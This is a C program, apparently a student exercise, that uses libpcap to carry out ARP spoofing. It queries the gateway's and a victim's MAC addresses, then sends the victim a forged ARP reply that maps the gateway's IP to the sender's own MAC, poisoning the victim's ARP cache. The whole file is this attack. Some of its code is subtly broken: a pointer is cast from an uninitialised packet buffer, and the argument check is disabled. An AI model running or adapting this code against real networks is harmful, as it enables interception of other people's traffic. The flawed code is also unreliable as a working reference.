#include <stdio.h>
#include <pcap.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netdb.h>
#include <linux/if.h>

struct arp_pac{
    uint8_t DesMac[6];
    uint8_t SouMac[6];
    uint8_t Type[2];
    uint8_t HWType[2];
    uint8_t ProtocolType[2];
    uint8_t HWSize[1];
    uint8_t ProSize[1];
    uint8_t Opcode[2];
    uint8_t SenderMac[6];
    uint8_t SenderIP[4];
    uint8_t TargetMac[6];
    uint8_t TargetIP[4];
    uint8_t padding[18];
    //60byte
};


int main(int argc, char* argv[])
{

    //
    if(argc!=4)
    {
        //return -1;
    }

    //need for cap packet
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);



    //send struct three packet
    struct arp_pac send_first;         //for parsing gateway mac address

    struct arp_pac send_last;          //for arp spoofing

    int i=0;
    struct in_addr addr;
    char* vic;
    char* gateway;
    uint8_t vic_ip[4];
    uint8_t gate_ip[4];



    struct ifreq s;
    int fd = socket(PF_INET,SOCK_DGRAM,IPPROTO_IP);


    vic = strtok(argv[2],".");
    while(vic!=NULL){
        vic_ip[i] = atoi(vic);
        vic=strtok(NULL,".");
        i++;
    }

    i=0;
    gateway = strtok(argv[3],".");
    while(gateway!=NULL){
        gate_ip[i]=atoi(gateway);
        gateway=strtok(NULL,".");
        i++;
    }



    memset(send_first.DesMac,0xff,sizeof(send_first.DesMac));
    send_first.Type[0] = 0x08;
    send_first.Type[1] = 0x06;
    send_first.HWType[0]=0x00;
    send_first.HWType[1]=0x01;
    send_first.ProtocolType[0]=0x08;
    send_first.ProtocolType[1]=0x00;
    send_first.HWSize[0]=6;
    send_first.ProSize[0]=4;
    send_first.Opcode[0]=0x00;
    send_first.Opcode[1]=0x01;

    strcpy(s.ifr_name,"ens33");
    ioctl(fd,SIOCGIFHWADDR,&s);
    //memcpy(send_first.SouMac,s.ifr_addr.sa_data,6);

    for(i=0;i<6;i++){
        send_first.SouMac[i] = (uint8_t)s.ifr_addr.sa_data[i];
    }


    fd = socket(AF_INET,SOCK_DGRAM,0);
    ioctl(fd, SIOCGIFADDR, &s);

    for(i=2;i<6;i++){
       send_first.SenderIP[i-2]=(uint8_t)s.ifr_addr.sa_data[i];
    }



    memset(send_first.TargetMac,0x00,sizeof(send_first.TargetMac));
    for(i=0; i<4; i++){
        send_first.TargetIP[i]=gate_ip[i];
    }


    //printf("%s\n",(const u_char*)&send_first);
    if(pcap_sendpacket(handle,(const u_char*)&send_first,42) != 0)
    {
        printf("error");
        return 0;
    }

    u_char* packet;

    struct arp_pac *p1;

    p1 = (struct arp_pac *)packet;

    struct pcap_pkthdr* header;
    int res=pcap_next_ex(handle, &header, &packet);


    uint8_t gate_mac_addr[6];
    for(i=0;i<6;i++)
    {
        gate_mac_addr[i] = p1->SenderMac[i];
    }


    for(i=0; i<4; i++){
        send_first.TargetIP[i]=vic_ip[i];
    }

    if(pcap_sendpacket(handle,(const u_char*)&send_first,42) != 0)
    {
        printf("error");
        return 0;
    }

    res=pcap_next_ex(handle, &header, &packet);


    uint8_t vic_mac_addr[6];
    for(i=0;i<6;i++)
    {
        vic_mac_addr[i] = p1->SenderMac[i];
    }


    ioctl(fd,SIOCGIFHWADDR,&s);

    for(i=0; i<6; i++)
    {
        send_first.SenderMac[i]=(uint8_t)s.ifr_addr.sa_data[i];
    }
    for(i=0; i<6;i++){
        send_first.DesMac[i] = vic_mac_addr[i];
    }
    send_first.Opcode[1]=0x02;

    for(i=0; i<4; i++){
        send_first.SenderIP[i]=gate_ip[i];
    }
    for(i=0; i<6; i++)
    {
        send_first.TargetMac[i] = vic_mac_addr[i];
    }
    for(i=0; i<4; i++){
        send_first.TargetIP[i]=vic_ip[i];
    }


    if(pcap_sendpacket(handle,(const u_char*)&send_first,42) != 0)
    {
        printf("error");
        return 0;
    }



    return 0;
}
